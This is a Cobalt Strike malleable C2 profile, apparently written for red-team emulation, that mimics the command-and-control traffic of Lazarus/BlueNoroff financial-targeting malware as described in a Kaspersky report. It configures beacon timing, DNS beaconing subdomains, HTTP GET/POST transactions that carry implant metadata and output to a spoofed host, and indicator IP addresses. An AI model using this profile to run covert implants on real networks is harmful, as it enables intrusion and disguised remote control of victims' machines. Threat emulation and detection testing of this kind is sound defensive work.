#imeklmg.exe
#2nd stage RAT C2 IOCs related to BlueNoroff, Lazarus financial targeting malware
#mostly taken from https://securelist.com/files/2017/04/Lazarus_Under_The_Hood_PDF_final.pdf  -- and mostly from 'Malware 6' section
#filled in legit info best I could..
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}


http-get {

    set uri "/view.jsp";
    
    client {

        header "Host" "update.toythieves.com";
        header "Accept" "*/*";
	header "Cookie" "0449651003fe48-Nff0eb7";
        parameter "action" "Execute";
        
        metadata {
            netbios;
            parameter "u";


        }

	parameter "Filename" "psmon.dat";
	parameter "Param" "82.144.131.5";

    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "nginx/1.4.6 (Ubuntu)";
        header "Connection" "close";
        

        output {
            netbios;
            print;
        }
    }
}

http-post {
    
    set uri "/View.jsp";
    set verb "GET";

    client {

        header "Host" "update.toythieves.com";
        header "Accept" "*/*";
        parameter "action" "Execute";
        
        output {
            netbios;
            parameter "u";


        }
        
        parameter "Filename" "avgnt.dat";
	parameter "Param" "120.88.46.206";
        
        id {
            base64url;
	    prepend "0449651003fe48-";
	    header "Cookie";

        }
    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "nginx/1.4.6 (Ubuntu)";
        header "Connection" "close";
        

        output {
            base64;
            print;
        }
    }
}

http-stager {
    server {
        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "nginx/1.4.6 (Ubuntu)";
        header "Connection" "close";
    
    }


}
#From 'Malware 6' in doc
stage {
	set compile_time "14 Jun 2016 11:56:42";
	set userwx "false";
	set image_size_x86 "487424";
}
